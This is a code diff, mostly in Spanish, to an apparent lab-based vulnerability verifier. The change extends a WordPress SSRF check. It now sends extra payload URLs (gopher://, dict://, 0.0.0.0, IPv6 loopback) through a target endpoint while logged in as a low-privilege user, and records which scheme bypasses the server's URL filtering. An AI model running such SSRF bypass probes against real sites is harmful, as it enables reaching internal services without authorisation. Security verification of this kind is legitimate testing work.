@@ -9223,6 +9223,38 @@ def verify_wordpress_ssrf(
                 res.evidence["listener_log_recorte"] = log[:1000]
                 break
 
+        # Extended SSRF URL variants: gopher://, dict://, 0.0.0.0, IPv6 loopback, etc.
+        # Run only when the main loop failed and there is budget left.
+        if not found and listener_ip and (time.time() - t0) < budget_s - 30:
+            _extra_tok = _token()
+            _extra_path = f"binoracle-ssrf-{_extra_tok}"
+            step("SSRF: probando variantes extendidas (gopher://, dict://, 0.0.0.0, IPv6)...")
+            for _xurl in _ssrf_url_variants(lab.listener, listener_ip, 8080, _extra_path):
+                _xpayload = dict(base_params)
+                _xpayload[url_param] = _xurl
+                step(f"SSRF extended: {m} {endpoint} {url_param}={_xurl!r}...")
+                _xentry: dict = {"url": _xurl, "token": _extra_tok, "extended": True}
+                try:
+                    _xr = boot.sub_sess.request(
+                        m, boot.base_url + endpoint,
+                        data=_xpayload if m != "GET" else None,
+                        params=_xpayload if m == "GET" else None, timeout=20)
+                    _xentry["status"] = _xr.status_code
+                except Exception as _xe:
+                    _xentry["peticion_error"] = str(_xe)
+                time.sleep(2)
+                _xlog = lab.listener_log()
+                _xentry["token_en_log"] = _extra_tok in _xlog
+                tried.append(_xentry)
+                if _extra_tok in _xlog:
+                    found = True
+                    res.evidence["callback_url_ganadora"] = _xurl
+                    res.evidence["token_ganador"] = _extra_tok
+                    res.evidence["listener_log_recorte"] = _xlog[:1000]
+                    res.evidence["ssrf_bypass_scheme"] = _xurl.split(":")[0]
+                    step(f"VERIFICADO (variante extendida): listener recibio token via {_xurl!r}")
+                    break
+
         res.evidence.update({
             "login_bajo_privilegio": boot.sub_user, "login_bajo_privilegio_password": boot.sub_pass,
             "url_param": url_param, "listener_ip": listener_ip,
@@ -9232,8 +9264,10 @@ def verify_wordpress_ssrf(
         if found:
             res.verified = True
             res.ok = True
-            res.detail = (f"SSRF confirmado: el listener interno (inalcanzable desde fuera del "
-                          f"laboratorio) recibio una conexion con el token exacto tras la "
+            _bypass_scheme = res.evidence.get("ssrf_bypass_scheme", "")
+            _scheme_note = (f" (bypass via scheme {_bypass_scheme!r})" if _bypass_scheme else "")
+            res.detail = (f"SSRF confirmado{_scheme_note}: el listener interno (inalcanzable desde "
+                          f"fuera del laboratorio) recibio una conexion con el token exacto tras la "
                           f"peticion con {url_param}={res.evidence['callback_url_ganadora']!r} "
                           f"-- prueba de que el SERVIDOR emitio la peticion saliente, no el "
                           f"navegador del atacante")
@@ -9257,10 +9291,10 @@ def verify_wordpress_ssrf(
         else:
             res.ok = True
             res.detail = (f"se probaron {len(tried)} variantes de URL/codificacion (hostname, IP "
-                          f"literal, decimal, hex, octal, truco de userinfo) y ninguna hizo que "
-                          f"el token llegara al listener interno -- el SSRF no se confirmo (puede "
-                          f"que el endpoint/parametro no sean los reales, o que el servidor "
-                          f"filtre de verdad las URLs internas antes de seguirlas)")
+                          f"literal, decimal, hex, octal, truco de userinfo, gopher://, dict://, "
+                          f"IPv6) y ninguna hizo que el token llegara al listener interno -- el "
+                          f"SSRF no se confirmo (puede que el endpoint/parametro no sean los "
+                          f"reales, o que el servidor filtre de verdad las URLs internas)")
         res.evidence["screenshots"] = boot.shots
         res.evidence["http_captures"] = boot.http_captures
         return res
